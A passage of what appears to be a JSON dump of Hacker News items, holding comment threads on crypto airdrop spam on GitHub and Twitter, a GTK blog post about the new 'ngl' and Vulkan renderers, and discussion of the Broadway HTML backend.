agoparentprevIsn't that about the same percentages for life before the internet? At least for rich people, who have their basic needs met without worry. reply dv_dt 10 hours agorootparentSee Sturgeons law, and discussion about Rudyard Kipling https://en.wikipedia.org/wiki/Sturgeon's_law reply ben_w 10 hours agoparentprevThe prisoners' dilemma would probably explain it: not enough risk that the spammers get negative reputations. reply thedaly 10 hours agoparentprevSpace, CPU cycles, attention. So much waste reply ronnier 8 hours agoprevAlso github pages and \"app\" pages are used to distribute scam dating site spam on social media platforms. The bad actors try to use the domain reputation of github to evade detection. It's extremely bad and seems to be out of control on github. Another thing, men, please, PLEASE, stop falling for these scams. No, beautiful women will not message you at random and show interest in you. Even unattractive ones won't. Please stop falling for these scams. Tell everyone you know to stop falling for these. If a random woman messages you to meet for sex, it's a scam. Do not fall for it, it will seem real and authentic, it's not. If you send nudes they will extort you out of money. reply itake 8 hours agoparent> If a random woman messages you to meet for sex, it's a scam. definitely not always a scam haha reply nerdponx 8 hours agorootparentUnless you are a male sex worker or in some kind of niche hookup community, it's a scam. Even on a dating site, it's probably a scam unless you are exceptionally attractive. reply basil-rash 6 hours agorootparentAn HN-ism if I’ve ever seen one. Women like sex, just as much as men (if not more so). Sure not every popup about “hot singles in your area” is legit, but women on dating sites messaging you with the goal of a quick night is definitely a thing. And I’m certainly not exceptionally attractive. reply ronnier 8 hours agorootparentprevYeah of course not always, but the vast majority of it is. reply Animats 10 hours agoprevGithub/Microsoft could sue the beneficiary of the spam. It's clear who that is. Binance is in legal trouble with the SEC right now.[1] Send this to the SEC lawyers going after Binance. You can find out who they are from SEC litigation announcements. If Binance can identify someone else to blame, they have a big incentive to do the work. [1] https://www.reuters.com/legal/binance-heads-court-seeking-di... reply woah 10 hours agoparentThis very likely has nothing to do with Binance or even AltLayer. The scam is to fool someone into signing a transaction that sends their tokens to the scammer. They are using the well known name of Binance to make it look legit. Trying to sue Binance for this would be like trying to sue Apple for \"You won a free iPad\" scams. Also, it has nothing at all to do with the SEC's jurisdiction. reply gear54rus 10 hours agoparentprevWhat proof is there that binance did this? reply TobyTheDog123 10 hours agorootparentI don't think that's what the commenter is claiming. I think they want to be able to sue the companies who indirectly benefit from this kind of spam, which is pretty ridiculous. However, crypto has become such a menace to society that it's time that governments do something about it, if they even can at this point. reply gear54rus 38 minutes agorootparentShall we sue banks for being mentioned in some scammy same-day loan ad too? Wouldn't that be a sight. One person's menace is another person's salvation :) reply Animats 5 hours agorootparentprev> I think they want to be able to sue the companies who indirectly benefit from this kind of spam, which is pretty ridiculous. There's the legal concept of an implicit or implied conspiracy. Usually comes up in antitrust law, where sellers raise prices at about the same time without actually getting together to talk about it.[1][2] It's a difficult area of law. [1] https://scholarship.law.wm.edu/cgi/viewcontent.cgi?article=2... [2] https://scholarship.law.duke.edu/cgi/viewcontent.cgi?article... reply dkarras 8 hours agoprevSame thing happens on Twitter. I login every week or so and my notifications are full of NFT scams. People tag me with an image and \"new mint dropped!!!1\" post, by the time I see it the tag is deleted but notification is still there. reply latchkey 5 hours agoparentBlock the word \"nft\". reply steve_rambo 4 hours agorootparentThat would present a problem if anyone mentions nftables, the main command to manage your firewall is named `nft` https://wiki.archlinux.org/title/nftables reply firtoz 2 hours agorootparentAt this point it's easier to rename the command reply paulproteus 10 hours agoprevSince LLMs model language, does anyone know of any LLM products/libraries that are spam detectors? reply manquer 10 hours agoparentBayesian filters worked very well for email spam. Google ( and most others) has been able to keep spam classifed long before transformers were even introduced with mostly Bayesian filters. Not saying it can or can’t be solved with transformers, just that could do it with lower cost(computational) older methods just as easily . reply jruohonen 7 hours agorootparent> Bayesian filters worked very well for email spam. As someone flagged me, I'd like to know how well current filters catch LLM-generated spam? By hypothesis, not well, especially given that you can always run a LLM output through f(g(h(...))). reply manquer 22 minutes agorootparentIt doesn't matter if human/LLM or its simply preset text is the source. Spam has to be consumed and \"bought\" by a human, so it is easy to classify as humans are predictable in what scams we fall for.[1] Most spam is advertisement for something to make you click, In the 90s and 00's in the early days of email, it was things like Viagra etc, today it is \"coin drops\" and crypto related things. Naive Bayesian filtering is a just a matter of training on the probability of such words in regular issue/PR/discussion comment threads and assigning a probability for the post and flagging it when crossing a threshold In the case of Github, they would probably refine and improve this by adjusting the weights for different topics. There is a good chance they already do this, and it just that the sensitivity for crypto scam words is set too low in crypto related projects as they would be probably used more by real people as well, and that is why OP noticed this as issue and rest of us rarely see much spam in Github. You could add reputation for the user globally and with respect to the project (akin to ESP reputation) and many other refinements in addition to Bayesian filtering. [1] Nigerian prince emails are written in poor English for a reason for example. You could bypass a filter yes, but people are far less likely fall for such evolved language defeating the purpose of sending spam in the first place. reply ben_w 10 hours agoparentprevWith a sample size of 2 because I've not tried before and it's late here, gpt-4-1106-preview seems to work OK at this just by asking for a probability. Though you will need to post-process the response because it says the usual blah blah blah ${number} blah blah reason blah. reply firtoz 2 hours agorootparentIt will be so expensive :( But btw now you can enforce function calling and json responses reply malfist 10 hours agoparentprevWould probably be way too expensive and probably not any better than the current generation of spam detection reply selcuka 9 hours agorootparent> Would probably be way too expensive Using OpenAI GPT-4, sure. On the other hand, running a small, fine-tuned LLM shouldn't be that resource intensive. It may not be any better than the current generation of spam detection, but it will not require rule updates, at least not that frequently. reply jerbear4328 5 hours agorootparentWhy even use an LLM? A classifier is perfectly suited for this kind of thing, and they aren't new. As far as I can tell, this is what is often used in the real world, and is incredibly cheap compared to an LLM, so GitHub/$OTHER_PLATFORM could totally run it on everything posted. They could even use a classifier as a first filtering step, then run a smarter model on flagged comments. (Then let a human double-check, right? Right?) reply thatxliner 4 hours agoprevI got the exact same comment on one of my repos as well reply SadCordDrone 7 hours agoprevMy first question is - are these spams fishing for direct victims, or some dirty SEO trick? reply csande17 7 hours agoparentIf it was an SEO trick, you'd think they wouldn't bother at-mentioning people. Usually SEO stuff tries to fly under the radar so it can stay online, and visible to search engines, for as long as possible. (Like the classic technique of spamming generic \"nice post!\" comments on WordPress blogs with your profile URL set to the spam site.) reply arp242 10 hours agoprevI have never experienced this kind of spam, and authors GitHub does not seem especially notable. But they are involved in cryptocurrency stuff. I guess that's why they were tagged in these threads. I think this says more about crypto grift than anything else. It's not \"GitHub spam\" so much as \"cryptocurrency spam\". Or: \"cryptocurrency and associated grift and scams makes everything worse, part 151\" reply rvz 10 hours agoprev> With the rise of generative AI and ChatGPT being able to write endless variations of 1 spam template to bypass the similarity check I just proposed above, content moderation will continue to be an uphill battle. It most likely will get even harder! Thanks to LLMs, the spam issue will get even worse on Github. reply echelon 10 hours agoparent> Thanks to LLMs, the spam issue will get even worse on Github. I think we'll quickly develop NLP/LLM filters for this. And while that may lead to an arms race, we'll likely simultaneously develop distributed systems for credibility attestation. We already rely on professional networks. We'll just grow all the more robust and capable along these lines. I'm actually extremely excited for automated systems that increase the signal. We've been in a noise trough for a while, and now we have means of filtering it. Edit: I don't necessarily refer to anything cryptocurrency related. We can build distributed networks of trust like the semantic web tried with PGP and FOAF, though I'm sure there are valuable tools and lessons we can borrow from the crypto folks' algorithms and research. reply ftmch 10 hours agorootparentEven though this post is about cryptocurrency spam, decentralized cryptocurrency networks could have a solution to this spam problem with so called Soulbound Tokens. reply quantumwoke 10 hours agoprevIt's not just issues either. Fake repo spam is terrible as well, usually some form of credentials or cryptocurrency theft software. GitHub really needs to implement moderation, and fast. reply mschuster91 10 hours agoprev [–] God, these crypto \"airdrop\" scams annoy me... it's just as bad on Twitter. I'm active in Community Notes and the inbox is like 1/3rd far-right conspiracies, 1/3rd other politics, and 1/3rd of zkSync scam alerts - never figured out what zkSync is or if that itself is some scam, it wouldn't surprise me. Some of these are even able to fake the target URL - the Tweet Card shows them going to \"starknet [.] io\", but hover over the link and it will actually point to \"reward - zksync [.] club\". I wonder what the fuck is going on at Twitter that they're unable to spot and hammer down on this. reply Jhsto 8 hours agoparentThe reason that zkSync and Starknet are targeted is that neither have run an \"airdrop\" or token distribution scheme, and both are rather well known projects in the scene. It's a bit pity for them. reply techdragon 10 hours agoparentprevLack of available staff, and a CEO who is probably mostly focused on finding some way to salvage advertising and has no time to spare on thinking about anything else because the advertising situation is just abysmally dire… I mean I think fully a quarter of the community notes I see directly on things in my timeline (not people sharing screenshots of particularly funny/interesting community notes) are people putting community notes on overpriced drop shipping scammers. The advertising situation seems completely doomed and when the CEO was picked to remedy that and the owner is in a nebulous executive role as “product owner” and simultaneously a hyper emotionally invested product user (based on credible reports and the publicly verifiable behaviour)… what can she really do besides do a good enough job for long enough that it won’t seem weird when she quits/takes another position. reply fwip 10 hours agoparentprev [–] Well, Twitter fired many of their competent employees, and most of the rest left. The remaining workers are incredibly overworked and understaffed. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "GitHub is facing a surge in spam activity, as scammers post fraudulent content, tag multiple users, and quickly delete the posts.",
      "The spam comments often involve cryptocurrency-related scams and have become more widespread in recent months.",
      "Users are struggling to report the spam messages since they are already removed, making it challenging to address the issue effectively."
    ],
    "commentSummary": [
      "Users discuss fraudulent practices, spam, and content moderation issues on popular online platforms like eBay, Amazon, GitHub, and Twitter.",
      "Negative experiences with unethical sellers, counterfeit goods, and return/refund difficulties are shared.",
      "Suggestions for stricter regulations, improved buyer protection, reputation systems, filtering methods, and language analysis models are proposed. Concerns are raised about Twitter's failure to address spam effectively due to inadequate staff."
    ],
    "points": 142,
    "commentCount": 85,
    "retryCount": 0,
    "time": 1706481942
  },
  {
    "id": 39172377,
    "title": "GTK Introduces New Renderers \"ngl\" and \"vulkan\" for Improved Features and Correctness",
    "originLink": "https://blog.gtk.org/2024/01/28/new-renderers-for-gtk/",
    "originBody": "New renderers for GTK Recently, GTK gained not one, but two new renderers: one for GL and one for Vulkan. Since naming is hard, we reused existing names and called them “ngl” and “vulkan”. They are built from the same sources, therefore we also call them “unified” renderers. But what is exciting about them? A single source As mentioned already, the two renderers are built from the same source. It is modeled to follow Vulkan apis, with some abstractions to cover the differences between Vulkan and GL (more specifically, GL 3.3+ and GLES 3.0+). This lets us share much of the infrastructure for walking the scene graph, maintaining transforms and other state, caching textures and glyphs, and will make it easier to keep both renderers up-to-date and on-par. Could this unified approach be extended further, to cover a Metal-based renderer on macOS or a DirectX-based one on Windows? Possibly. The advantage of the Vulkan/GL combination is that they share basically the same shader language (GLSL, with some variations). That isn’t the case for Metal or DirectX. For those platforms, we either need to duplicate the shaders or use a translation tool like SPIRV-Cross. If that is the kind of thing that excites you, help is welcome. Implementation details The old GL renderer uses simple shaders for each rendernode type and frequently resorts to offscreen rendering for more complex content. The unified renderers have (more capable) per-node shaders too, but instead of relying on offscreens, they will also use a complex shader that interprets data from a buffer. In game programming, this approach is known as a ubershader. The unified renderer implementation is less optimized than the old GL renderer, and has been written with a focus on correctness and maintainability. As a consequence, it can handle much more varied rendernode trees correctly. Here is an harmless-looking example: repeat { bounds: 0 0 50 50; child: border { outline: 0 0 4.3 4.3; widths: 1.3; } } gl (left) ngl (right) A close-up view New capabilities We wouldn’t have done all this work, if there wasn’t some tangible benefit. Of course, there’s new features and capabilities. Lets look at some: Antialiasing. A big problem with the old GL renderer is that it will just lose fine details. If something is small enough to fall between the boundaries of a single line of pixels, it will simply disappear. In particular this can affect underlines, such as mnemonics. The unified renderers handle such cases better, by doing antialiasing. This helps not just for preserving fine detail, but also prevents jagged outlines of primitives. Close-up view of GL vs NGL Fractional scaling. Antialiasing is also the basis that lets us handle fractional scales properly. If your 1200 × 800 window is set to be scaled to 125 %, with the unified renderers, we will use a framebuffer of size 1500 × 1000 for it, instead of letting the compositor downscale a 2400 × 1600 image. Much less pixels, and a sharper image. Arbitrary gradients. The old GL renderer handles linear, radial and conic gradients with up to 6 color stops. The unified renders allow an unlimited number of color stops. The new renderers also apply antialiasing to gradients, so sharp edges will have smooth lines. A linear gradient with 64 color stops Dmabufs. As a brief detour from the new renderers, we worked on dmabuf support and graphics offloading last fall. The new renderers support this and extend it to create dmabufs when asked to produce a texture via the render_texture api (currently, just the Vulkan renderer). Any sharp edges? As is often the case, with new capabilities comes the potential for new gotchas. Here are some things to be aware of, as an app developer: No more glshader nodes. Yes, they made for some fancy demos for 4.0, but they are very much tied to the old GL renderer, since they make assumptions about the GLSL api exposed by that renderer. Therefore, the new renderers don’t support them. You have been warned in the docs: If there is a problem, this function returns FALSE and reports an error. You should use this function before relying on the shader for rendering and use a fallback with a simpler shader or without shaders if it fails. Thankfully, many uses of the glshader node are no longer necessary, since GTK has gained new features since 4.0, such as mask nodes and support for straight-alpha textures. Fractional positions. The old GL renderer is rounding things, so you could get away with handing it fractional positions. The new renderers will place things where you tell it. This can sometimes have unintended consequences, so should be on the lookout and make sure that your positions are where they should be. In particular, look out for out for cairo-style drawing where you place lines at half-pixel positions so they fill out one row of pixels precisely. Driver problems. The new renderers are using graphics drivers in new and different ways, so there is potential for triggering problems on that side. Please file problems you see against GTK even if they look like driver issues, since it is useful for us to get an overview how well (or badly) the new code works with the variety of drivers and hardware out there. But is it faster? No, the new renderers are not faster (yet). The old GL renderer is heavily optimized for speed. It also uses much simpler shaders, and does not do the math that is needed for features such as antialiasing. We want to make the new renderers faster eventually, but the new features and correctness make them very exciting, even before we reach that goal. All of the GPU-based renderers are more than fast enough to render todays GTK apps at 60 or 144 fps. That being said, the Vulkan renderer comes close to matching and surpassing the old GL renderer in some unscientific benchmarks. The new GL renderer is slower for some reason that we have not tracked down yet. New defaults In the just-released 4.13.6 snapshot, we have made the ngl renderer the new default. This is a trial balloon — the renderers need wider testing with different apps too verify that they are ready for production. If significant problems appear, we can revert back to the gl renderer for 4.14. We decided not make the Vulkan renderer the default yet, since it is behind the GL renderers in a few application integration aspects: the webkit GTK4 port works with GL, not with Vulkan, and GtkGLArea and GtkMediaStream currently both produce GL textures that the Vulkan renderer can’t directly import. All of these issues will hopefully be addressed in the not-too-distant future, and then we will revisit the default renderer decision. If you are using GTK on very old hardware, you may be better off with the old GL renderer, since it makes fewer demands on the GPU. You can override the renderer selection using the GSK_RENDERER environment variable: GSK_RENDERER=gl Future plans and possibilities The new renderers are a good foundation to implement things that we’ve wanted to have for a long time, such as Proper color handling (including HDR) Path rendering on the GPU Possibly including glyph rendering Off-the-main-thread rendering Performance (on old and less powerful devices) Some of these will be a focus of our work in the near and medium-term future. Summary The new renderers have some exciting features, with more to come. Please try them out, and let us know what works and what doesn’t work for you. Author mclasenPosted on January 28, 2024January 28, 2024Categories Uncategorized",
    "commentLink": "https://news.ycombinator.com/item?id=39172377",
    "commentBody": "New Renderers for GTK (gtk.org)136 points by Decabytes 6 hours agohidepastfavorite18 comments wg0 2 hours agoLomg time ago, I think 2010ish, there was an experimental HTML renderer that would open up a GTK app in a browser that has its UI using plain HTML+CSS. For the time, it was just jaw dropping. For context, I think it was before Atom, VS Code or Electron (or possibly even NodeJS?) was a thing. Don't know if that HTML renderer is still around or not. reply ho_schi 2 hours agoparentYou mean Broadway? https://docs.gtk.org/gtk4/broadway.html https://www.phoronix.com/news/GTK4-Broadway-Being-Used I did not considered it as main/official backend but it is still there and was ported to Gtk4. reply wg0 1 hour agorootparentOh yes, that's it. Thanks for posting. I think its so beautiful. It is one of those things that have pure artisan value. Of craftsmanship. Whether it is used widely or not, I wish this backend to be there. Back then, I did run Open Office in Firefox and it amazed me. reply no_time 1 hour agoparentprevCalling it a \"HTML renderer\" is a bit of a strech. Atleast in GTK3 it just streams pixel data into a canvas element, effectively being the same as VNC with a web viewer. https://imgur.com/a/2EDZ2Ti reply chrismorgan 1 hour agoparentprevAlthough it uses more HTML and CSS than some similar things, I don’t think it’s fair to call it “plain HTML + CSS”, because it displays more functional characteristics of the pure canvas approach (where you throw away just about everything the browser gives you and start from scratch). My three primary heuristics for proper behaviour are: (a) using browser scrolling (the web doesn’t expose the right primitives to make a scroll-event-based reimplementation anything but bad, barely noticeable in some configurations but painfully broken in some of the most common configurations); (b) using browser text rendering (strongly preferably by DOM nodes, but even canvas plus fillText can be acceptable); and (c) handling links with realelements (no alternative can provide the same functionality). Broadway fails all three of these (reimplementing scrolling, rendering text on the server and sending images, and I think actually locking up when you try to click on a link). It also fails my fourth and fifth tests, which are (d) handling text input properly (it looks like it just uses key events, not even a backingoror contenteditable, so IME composition fails completely and keyboard navigation will presumably be GTK rather than native); and (d) having a meaningful accessibility tree (preferably backed by normal DOM stuff, but not necessarily; I place this one last despite its importance because it’s likely to be more retrofittable than the others, though it’ll still generally be hard). I’d count Broadway as suitable for tech demos and for personal use where you know you don’t mind its limitations, but not for any sort of public deployment. It’s basically just an RDP/VNC sort of thing, with a smattering of DOM use. (Also remember that’s how it works—the code is all running on the server.) reply arghwhat 2 hours agoparentprevIt's called Broadway: https://docs.gtk.org/gtk4/broadway.html reply wg0 1 hour agorootparentImpressive. Web was very primitive back then compared to how it is today. I think there was no flex, no grids, no ESM modules even. It might not sound impressive in 2024 but back then, it was a huge deal. Very daring to even attempt something like that IMHO. It was a time of YUI, jQuery, ExtJS, script.aculo.us and such. reply toyg 1 hour agorootparentQML pre-dates it by a year or so, it's basically in the same vein. Everyone wanted to co-opt web-devs for desktop development at that point. reply actionfromafar 1 hour agorootparentHaha, they got quite a bit more than they bargained for. Hello Electron. reply moondev 1 hour agoparentprevbroadway - A while back I created a little POC for running it inside docker which worked really well. https://github.com/moondev/gtk3-docker My use case was running a browser inside a browser to easily interact with Kubernetes clusterip services without needing to port forward or proxy. Another awesome example: running virt-manager to run a vm via the gtk virt-viewer (and interacting with it through the browser) https://github.com/m-bers/docker-virt-manager reply troupo 1 hour agoparentprevI think qbittorrent still uses that for its web ui reply steve_rambo 1 hour agorootparentNot really. qBittorent is built on Qt (thus the prefix), and has a hand-rolled webui in pure html + css + js (with a couple of helper libraries, but no heavy frameworks): https://github.com/qbittorrent/qBittorrent/tree/master/src/w... reply troupo 1 hour agorootparentKudos to them then. It's really well done reply enriquto 1 hour agoprevI'd love to see an ansi text renderer, to be able to run gtk programs inside my xterm (optionally, with some sixel thrown in...). reply moondev 45 minutes agoparentbroadway (discussed in other comments) + carbonyl is kind of similar https://github.com/fathyb/carbonyl https://i.imgur.com/pIQ4K7Q.png reply akdor1154 19 minutes agoprevPixel-perfect fractional scaling, baby, woohoo! reply sim7c00 1 hour agoprevlooks like so much fun workin on this :) cool stuff. When i read about the anti-aliasing i thought nice, maybe signed distance fields will work just as nice for font rendering at arbitrary scales as in game engines... (Valve had a nice paper out there on this). there's lots of cool trickery in game renderers in UI code and for things like rendering decals that might be nice in gui code too. reply einpoklum 5 minutes agoprev [–] Now that you're all done with this thing, how about working on a decent file chooser dialog? You know, the one we've been waiting for 20 years to be fixed? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "GTK has introduced two new renderers, \"ngl\" and \"vulkan,\" with the same source code for GL and Vulkan support, making maintenance and updates easier.",
      "The new renderers come with advanced features like antialiasing, fractional scaling, gradients, and dmabufs support.",
      "Although the new renderers are not currently faster than the old GL renderer, they offer improved features and correctness, laying the foundation for future plans such as better color handling, GPU path rendering, and off-the-main-thread rendering. Users are encouraged to try them out and provide feedback."
    ],
    "commentSummary": [
      "The article explores the development of new renderers for GTK, with a focus on the Broadway HTML renderer.",
      "The Broadway renderer enables GTK apps to be shown in a browser using HTML and CSS, garnering praise for its craftsmanship.",
      "Commenters discuss the limitations of the Broadway backend and make comparisons to other technologies like QML and Electron. The article also mentions potential improvements to GTK, such as an ANSI text renderer and pixel-perfect fractional scaling."
    ],
    "points": 136,
    "commentCount": 18,
    "retryCount": 0,
    "time": 1706498650
  }
]
